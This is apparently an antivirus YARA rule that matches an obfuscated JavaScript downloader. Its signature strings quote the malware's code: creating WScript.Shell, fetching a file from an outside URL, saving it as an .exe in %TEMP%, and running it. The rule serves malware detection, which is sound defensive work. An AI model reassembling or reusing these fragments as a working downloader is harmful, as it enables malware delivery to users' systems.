rule sig_20160328_a8a1fa3a4e575fef23c3232b8f891dff {
  meta:
    description = "datamaliciousorder - file 20160328_a8a1fa3a4e575fef23c3232b8f891dff.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e40a9b164503b9d1c168c104e06aa174cd2be21af8ba9587a8d8a578601c94ba"

  strings:
    $s1  = "function Wbhoxgl() {return Xkirvomq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"zHKML5YaxTsWH.exe\";};" fullword ascii
    $s2  = "do {WScript[Odbclbzoas](Tpqlnip() * 11)} while (Rlhzq[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Lwxhiodpe(Kwapwp, Xlmspbfcr){return Kwapwp - Xlmspbfcr;};" fullword ascii
    $s4  = "var Xkirvomq = function Nzvwyf() {return WScript[Fbixfliari](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Rlhzq[Cotevbs](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s6  = "function Euzfqhnulh() {return ((Alyxa == true) && (Alyxa == Awxueb)) ? 1 : Dsmdsbwyxc;};" fullword ascii
    $s7  = "function Trwhuss(Qjdqfjrhwr){Xkirvomq[\"Run\"](Qjdqfjrhwr, Dsmdsbwyxc, Dsmdsbwyxc);};" fullword ascii
    $s8  = "Awxueb = true; " fullword ascii
    $s9  = " while (Tyaoxmugay){" fullword ascii
    $s10 = "function Irgvnheoa(){return Jqfycmrxm;};" fullword ascii
    $s11 = "function Tpqlnip(){return 22;};" fullword ascii
    $s12 = "var Rosxlfm = false;" fullword ascii
    $s13 = "var Kujbhie = new this[\"Date\"]();" fullword ascii
    $s14 = "Alyxa = true; " fullword ascii
    $s15 = "var Alyxa = false;" fullword ascii
    $s16 = "function Feslki()" fullword ascii
    $s17 = "var Awxueb = false;" fullword ascii
    $s18 = "function Fhgdifs(){return Fbixfliari;};" fullword ascii
    $s19 = "return Lwxhiodpe(Psoclpql, Lbkei);" fullword ascii
    $s20 = "function Zywyelrr(Mwbiupcazn) {var Vftnt = (1, 2, 3, 4, 5, Mwbiupcazn); return Vftnt;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}